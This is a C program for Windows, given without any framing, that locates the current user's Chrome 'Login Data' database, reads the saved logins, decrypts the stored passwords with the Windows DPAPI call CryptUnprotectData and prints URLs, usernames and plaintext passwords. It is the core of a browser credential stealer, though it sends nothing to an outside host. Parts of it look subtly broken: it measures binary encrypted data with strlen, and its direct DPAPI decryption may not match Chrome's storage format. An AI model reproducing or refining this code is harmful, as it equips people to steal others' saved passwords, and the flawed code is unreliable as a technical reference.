#include <stdio.h>
#include <sqlite3.h>
#include <windows.h>
#include <wincrypt.h>
#pragma comment(lib, "crypt32.lib")

BOOL DecryptPassword(BYTE *encryptedData, DWORD encryptedDataLen, BYTE **decryptedData, DWORD *decryptedDataLen);

int callback(void *data, int argc, char **argv, char **azColName) {
    printf("\n");
    for (int i = 0; i < argc; i++) {
        if (strcmp(azColName[i], "password_value") == 0 && argv[i] != NULL) {
            BYTE *encryptedData = (BYTE *)argv[i];
            DWORD encryptedDataLen = strlen(argv[i]);
            BYTE *decryptedData = NULL;
            DWORD decryptedDataLen = 0;

            if (DecryptPassword(encryptedData, encryptedDataLen, &decryptedData, &decryptedDataLen)) {
                printf("Password: %.*s\n", decryptedDataLen, decryptedData);
                LocalFree(decryptedData);
            } else {
                printf("Password: [Decryption Failed]\n");
            }
        } else if (strcmp(azColName[i], "username_value") == 0) {
            printf("Username: %s\n", argv[i] ? argv[i] : "NULL");
        } else {
            printf("%s: %s\n", 
                azColName[i] ? azColName[i] : "Unknown Column", 
                argv[i] ? argv[i] : "NULL");
        }
    }
    printf("\n");
    return 0;
}

BOOL DecryptPassword(BYTE *encryptedData, DWORD encryptedDataLen, BYTE **decryptedData, DWORD *decryptedDataLen) {
    DATA_BLOB dataIn = { encryptedDataLen, encryptedData };
    DATA_BLOB dataOut = { 0, NULL };
    
    if (!CryptUnprotectData(&dataIn, NULL, NULL, NULL, NULL, 0, &dataOut)) {
        DWORD error = GetLastError();
        fprintf(stderr, "Decryption failed. Error code: %lu\n", error);
        return FALSE;
    }
    
    *decryptedData = dataOut.pbData;
    *decryptedDataLen = dataOut.cbData;
    return TRUE;
}

void FetchSavedPasswords(const char* dbPath) {
    sqlite3 *db;
    char *zErrMsg = 0;
    int rc;

    rc = sqlite3_open(dbPath, &db);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "Cannot open database: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);
        return;
    }

    const char *sql = "SELECT origin_url, username_value, password_value FROM logins";
   
    rc = sqlite3_exec(db, sql, callback, 0, &zErrMsg);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "SQL error: %s\n", zErrMsg);
        sqlite3_free(zErrMsg);
    }

    sqlite3_close(db);
}

void GetChromeLoginDataPath(char *dbPath, size_t bufferSize) {
    char userProfile[MAX_PATH];
    if (GetEnvironmentVariable("USERPROFILE", userProfile, sizeof(userProfile)) > 0) {
        snprintf(dbPath, bufferSize, "%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", userProfile);
    } else {
        fprintf(stderr, "Error retrieving user profile directory.\n");
        dbPath[0] = '\0';  
    }
}

int main() {
    char dbPath[MAX_PATH];
    GetChromeLoginDataPath(dbPath, sizeof(dbPath));
   
    if (dbPath[0] == '\0') {
        fprintf(stderr, "Failed to retrieve Chrome Login Data path. Exiting.\n");
        return 1;
    }

    printf("Analyzing local password database: %s\n", dbPath);
    FetchSavedPasswords(dbPath);

    printf("\nPress Enter to exit...");
    getchar();

    return 0;
}
